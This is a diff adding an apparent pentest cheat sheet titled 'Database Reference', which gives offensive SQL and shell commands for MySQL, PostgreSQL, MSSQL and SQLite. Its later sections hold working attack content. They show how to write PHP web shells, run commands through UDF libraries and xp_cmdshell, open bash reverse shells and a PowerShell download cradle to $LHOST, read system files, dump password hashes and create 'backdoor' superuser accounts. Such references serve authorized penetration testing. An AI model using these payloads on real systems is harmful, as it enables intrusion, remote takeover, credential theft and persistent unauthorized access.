@@ -1,0 +1,349 @@
+---
+title: "Database Reference"
+---
+
+Quick syntax reference for the four most common databases encountered during pentests. Organized by task: find what you want to do, pick the DB tab.
+
+## Connecting
+
+<Tabs>
+  <Tab title="MySQL">
+    ```bash wrap
+    mysql -u $USER -p$PASSWORD -h $HOST $DATABASE
+    mysql -u $USER -p$PASSWORD -h $HOST -e "SELECT 1"
+    ```
+  </Tab>
+  <Tab title="PostgreSQL">
+    ```bash wrap
+    psql -U $USER -h $HOST -d $DATABASE
+    psql "postgresql://$USER:$PASSWORD@$HOST/$DATABASE"
+    psql -U $USER -h $HOST -d $DATABASE -c "SELECT 1"
+    ```
+  </Tab>
+  <Tab title="MSSQL">
+    ```bash wrap
+    # impacket (from Linux)
+    mssqlclient.py $DOMAIN/$USER:$PASSWORD@$TARGET
+    mssqlclient.py $USER:$PASSWORD@$TARGET -windows-auth
+
+    # sqsh
+    sqsh -S $TARGET -U $USER -P $PASSWORD -D $DATABASE
+    ```
+  </Tab>
+  <Tab title="SQLite">
+    ```bash wrap
+    sqlite3 database.db
+    sqlite3 database.db "SELECT 1"
+    ```
+  </Tab>
+</Tabs>
+
+## Situational Awareness
+
+<Tabs>
+  <Tab title="MySQL">
+    ```sql wrap
+    SELECT user(), version(), database();
+    SELECT @@hostname, @@datadir, @@secure_file_priv;
+    SHOW GRANTS FOR CURRENT_USER();
+    ```
+  </Tab>
+  <Tab title="PostgreSQL">
+    ```sql wrap
+    SELECT current_user, session_user, version();
+    SELECT usename, usesuper, usecreaterole FROM pg_user;
+    \conninfo
+    ```
+  </Tab>
+  <Tab title="MSSQL">
+    ```sql wrap
+    SELECT SYSTEM_USER, USER_NAME(), @@SERVERNAME, @@VERSION;
+    SELECT IS_SRVROLEMEMBER('sysadmin');
+    EXEC sp_helpuser;
+    ```
+  </Tab>
+  <Tab title="SQLite">
+    ```sql wrap
+    SELECT sqlite_version();
+    .databases
+    ```
+  </Tab>
+</Tabs>
+
+## Enumeration
+
+<AccordionGroup>
+  <Accordion title="Databases">
+    <Tabs>
+      <Tab title="MySQL">
+        ```sql wrap
+        SHOW DATABASES;
+        SELECT schema_name FROM information_schema.schemata;
+        ```
+      </Tab>
+      <Tab title="PostgreSQL">
+        ```sql wrap
+        \l
+        SELECT datname FROM pg_database;
+        ```
+      </Tab>
+      <Tab title="MSSQL">
+        ```sql wrap
+        SELECT name FROM sys.databases;
+        EXEC sp_databases;
+        ```
+      </Tab>
+      <Tab title="SQLite">
+        ```sql wrap
+        .databases
+        ATTACH DATABASE 'other.db' AS other;
+        ```
+      </Tab>
+    </Tabs>
+  </Accordion>
+  <Accordion title="Tables">
+    <Tabs>
+      <Tab title="MySQL">
+        ```sql wrap
+        SHOW TABLES;
+        SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();
+        SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema = '$DATABASE';
+        ```
+      </Tab>
+      <Tab title="PostgreSQL">
+        ```sql wrap
+        \dt
+        \dt *.*
+        SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
+        ```
+      </Tab>
+      <Tab title="MSSQL">
+        ```sql wrap
+        SELECT name FROM sys.tables;
+        SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE';
+        SELECT name FROM $DATABASE.sys.tables;
+        ```
+      </Tab>
+      <Tab title="SQLite">
+        ```sql wrap
+        .tables
+        SELECT name FROM sqlite_master WHERE type = 'table';
+        ```
+      </Tab>
+    </Tabs>
+  </Accordion>
+  <Accordion title="Columns">
+    <Tabs>
+      <Tab title="MySQL">
+        ```sql wrap
+        DESCRIBE $TABLE;
+        SHOW COLUMNS FROM $TABLE;
+        SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '$TABLE';
+        ```
+      </Tab>
+      <Tab title="PostgreSQL">
+        ```sql wrap
+        \d $TABLE
+        SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '$TABLE';
+        ```
+      </Tab>
+      <Tab title="MSSQL">
+        ```sql wrap
+        SELECT name, type_name(system_type_id) FROM sys.columns WHERE object_id = OBJECT_ID('$TABLE');
+        SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME = '$TABLE';
+        EXEC sp_columns $TABLE;
+        ```
+      </Tab>
+      <Tab title="SQLite">
+        ```sql wrap
+        .schema $TABLE
+        PRAGMA table_info($TABLE);
+        ```
+      </Tab>
+    </Tabs>
+  </Accordion>
+</AccordionGroup>
+
+## File Operations
+
+<AccordionGroup>
+  <Accordion title="Read Files">
+    <Tabs>
+      <Tab title="MySQL">
+        ```sql wrap
+        -- Requires FILE privilege; secure_file_priv must be '' or the target path
+        SELECT LOAD_FILE('/etc/passwd');
+        SELECT LOAD_FILE('C:\\Windows\\win.ini');
+        ```
+      </Tab>
+      <Tab title="PostgreSQL">
+        ```sql wrap
+        -- pg_read_file is superuser-only; path is relative to the data directory
+        SELECT pg_read_file('pg_hba.conf');
+
+        -- COPY can read arbitrary files as superuser
+        CREATE TABLE tmp (content TEXT);
+        COPY tmp FROM '/etc/passwd';
+        SELECT * FROM tmp;
+        ```
+      </Tab>
+      <Tab title="MSSQL">
+        ```sql wrap
+        -- Via xp_cmdshell
+        EXEC xp_cmdshell 'type C:\Windows\win.ini';
+        EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';
+
+        -- BULK INSERT reads a file into a table
+        CREATE TABLE tmp (line NVARCHAR(4000));
+        BULK INSERT tmp FROM 'C:\Windows\win.ini' WITH (ROWTERMINATOR = '\n');
+        SELECT * FROM tmp;
+        ```
+      </Tab>
+      <Tab title="SQLite">
+        ```sql wrap
+        -- No native file read; use interactive shell commands
+        .shell cat /etc/passwd
+        .system type C:\Windows\win.ini
+        ```
+      </Tab>
+    </Tabs>
+  </Accordion>
+  <Accordion title="Write Files">
+    <Tabs>
+      <Tab title="MySQL">
+        ```sql wrap
+        -- Requires FILE privilege and secure_file_priv = ''
+        SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+        -- DUMPFILE writes binary without line terminators (better for executables)
+        SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO DUMPFILE '/var/www/html/shell.php';
+        ```
+      </Tab>
+      <Tab title="PostgreSQL">
+        ```sql wrap
+        -- COPY TO writes server-side (superuser)
+        COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
+        ```
+      </Tab>
+      <Tab title="MSSQL">
+        ```sql wrap
+        -- Via xp_cmdshell
+        EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
+        EXEC xp_cmdshell 'powershell -enc $B64_PAYLOAD';
+        ```
+      </Tab>
+      <Tab title="SQLite">
+        ```sql wrap
+        .shell sh -c 'echo payload > /path/to/file'
+        ```
+      </Tab>
+    </Tabs>
+  </Accordion>
+</AccordionGroup>
+
+## Command Execution
+
+<Tabs>
+  <Tab title="MySQL">
+    ```sql wrap
+    -- UDF approach: drop a malicious shared library into the plugin dir, then load it
+    SELECT @@plugin_dir;
+    SELECT binary 0x$UDF_HEX INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+    CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
+    SELECT sys_exec('id > /tmp/out');
+    SELECT sys_exec('bash -i >& /dev/tcp/$LHOST/4444 0>&1');
+    ```
+  </Tab>
+  <Tab title="PostgreSQL">
+    ```sql wrap
+    -- COPY FROM PROGRAM executes a shell command (PostgreSQL 9.3+, superuser)
+    CREATE TABLE cmd_output (output TEXT);
+    COPY cmd_output FROM PROGRAM 'id';
+    SELECT * FROM cmd_output;
+
+    -- Reverse shell
+    COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"';
+    ```
+  </Tab>
+  <Tab title="MSSQL">
+    ```sql wrap
+    -- Enable xp_cmdshell (requires sysadmin)
+    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+    -- Execute commands
+    EXEC xp_cmdshell 'whoami';
+    EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$LHOST/rev.ps1'')"';
+    ```
+  </Tab>
+  <Tab title="SQLite">
+    ```sql wrap
+    -- Interactive shell only; not injectable via SQL
+    .shell id
+    .system whoami
+    ```
+  </Tab>
+</Tabs>
+
+## User Management
+
+<AccordionGroup>
+  <Accordion title="List Users and Privileges">
+    <Tabs>
+      <Tab title="MySQL">
+        ```sql wrap
+        SELECT user, host, authentication_string FROM mysql.user;
+        SHOW GRANTS FOR '$USER'@'$HOST';
+        SHOW GRANTS FOR CURRENT_USER();
+        ```
+      </Tab>
+      <Tab title="PostgreSQL">
+        ```sql wrap
+        \du
+        SELECT usename, usesuper, usecreaterole FROM pg_user;
+        SELECT usename, passwd FROM pg_shadow;   -- superuser only
+        ```
+      </Tab>
+      <Tab title="MSSQL">
+        ```sql wrap
+        SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U');
+        SELECT name FROM sys.database_principals;
+        EXEC sp_helpsrvrolemember 'sysadmin';
+        ```
+      </Tab>
+      <Tab title="SQLite">
+        ```sql wrap
+        -- No user system; access control is filesystem-level
+        ```
+      </Tab>
+    </Tabs>
+  </Accordion>
+  <Accordion title="Create Backdoor Users">
+    <Tabs>
+      <Tab title="MySQL">
+        ```sql wrap
+        CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Password123!';
+        GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
+        FLUSH PRIVILEGES;
+        ```
+      </Tab>
+      <Tab title="PostgreSQL">
+        ```sql wrap
+        CREATE USER backdoor WITH SUPERUSER PASSWORD 'Password123!';
+        ALTER USER $USER WITH SUPERUSER;
+        ```
+      </Tab>
+      <Tab title="MSSQL">
+        ```sql wrap
+        CREATE LOGIN backdoor WITH PASSWORD = 'Password123!';
+        EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
+        ```
+      </Tab>
+      <Tab title="SQLite">
+        ```sql wrap
+        -- No user system
+        ```
+      </Tab>
+    </Tabs>
+  </Accordion>
+</AccordionGroup>
